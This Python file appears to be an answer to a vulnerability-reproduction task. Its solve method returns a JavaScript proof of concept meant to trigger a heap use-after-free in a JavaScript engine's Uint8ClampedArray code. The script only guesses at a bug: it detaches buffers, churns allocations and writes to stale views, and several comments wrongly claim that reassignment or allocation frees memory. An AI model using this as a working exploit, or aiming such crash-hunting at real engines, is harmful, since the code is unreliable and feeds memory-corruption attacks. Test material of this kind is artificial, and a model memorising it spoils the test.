import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a JavaScript file that triggers the heap use-after-free
        js_code = '''// Trigger heap use-after-free in Uint8ClampedArray implementation
function trigger_uaf() {
    // Allocate a Uint8ClampedArray
    var arr = new Uint8ClampedArray(1024);
    
    // Create multiple references to the same underlying buffer
    var arr2 = new Uint8ClampedArray(arr.buffer);
    var arr3 = new Uint8ClampedArray(arr.buffer, 256, 256);
    
    // Force garbage collection to potentially free memory
    for (var i = 0; i < 100000; i++) {
        var temp = new Uint8ClampedArray(1024);
        if (i % 1000 === 0) {
            try {
                // Access array after potential free
                arr[0] = 42;
                arr2[0] = 42;
                arr3[0] = 42;
            } catch(e) {
                // Ignore errors during fuzzing
            }
        }
    }
    
    // Detach the ArrayBuffer while keeping references to the views
    try {
        // Various ways to potentially trigger the bug
        var detached = arr.buffer.transfer ? arr.buffer.transfer() : null;
    } catch(e) {}
    
    // Try to use the arrays after potential detachment
    for (var i = 0; i < arr.length; i++) {
        try {
            arr[i] = i % 256;
            arr2[i] = (i + 1) % 256;
            if (i < arr3.length) {
                arr3[i] = (i + 2) % 256;
            }
        } catch(e) {
            // Continue even if errors occur
        }
    }
    
    // Create many arrays to stress the allocator
    var arrays = [];
    for (var i = 0; i < 1000; i++) {
        arrays.push(new Uint8ClampedArray(128));
        // Interleave with regular arrays
        arrays.push(new Array(64).fill(0));
    }
    
    // Access the original arrays after creating many new ones
    try {
        var sum = 0;
        for (var i = 0; i < arr.length; i += 16) {
            sum += arr[i];
            sum += arr2[i];
            if (i < arr3.length) {
                sum += arr3[i];
            }
        }
        return sum;
    } catch(e) {
        return -1;
    }
}

// Main execution
function main() {
    var results = [];
    for (var iter = 0; iter < 10; iter++) {
        results.push(trigger_uaf());
        
        // Create dangling references by reassigning
        var dangling_refs = [];
        for (var j = 0; j < 100; j++) {
            var buf = new ArrayBuffer(512);
            var view1 = new Uint8ClampedArray(buf);
            var view2 = new Uint8ClampedArray(buf, 128, 128);
            dangling_refs.push(view1);
            dangling_refs.push(view2);
            
            // Reassign buffer to potentially cause use-after-free
            buf = new ArrayBuffer(256);
            
            // Try to use old views
            try {
                view1[0] = iter;
                view2[0] = iter + 1;
            } catch(e) {}
        }
        
        // Mix with other typed array types
        var mixed = [
            new Uint8Array(256),
            new Int8Array(256),
            new Uint16Array(128),
            new Int16Array(128),
            new Uint32Array(64),
            new Int32Array(64),
            new Float32Array(64),
            new Float64Array(32)
        ];
        
        // Force garbage collection by allocating and dropping
        for (var k = 0; k < 10000; k++) {
            var temp = new Uint8ClampedArray(k % 256 + 1);
            if (k % 100 === 0) {
                try {
                    // Access potentially freed memory
                    for (var ref of dangling_refs) {
                        if (ref.length > 0) {
                            ref[0] = k;
                        }
                    }
                } catch(e) {}
            }
        }
    }
    return results;
}

// Execute and capture any crashes
try {
    var res = main();
    console.log("Result:", res);
} catch(e) {
    console.error("Error:", e);
}
'''
        
        # The PoC should be the JavaScript code as bytes
        return js_code.encode('utf-8')
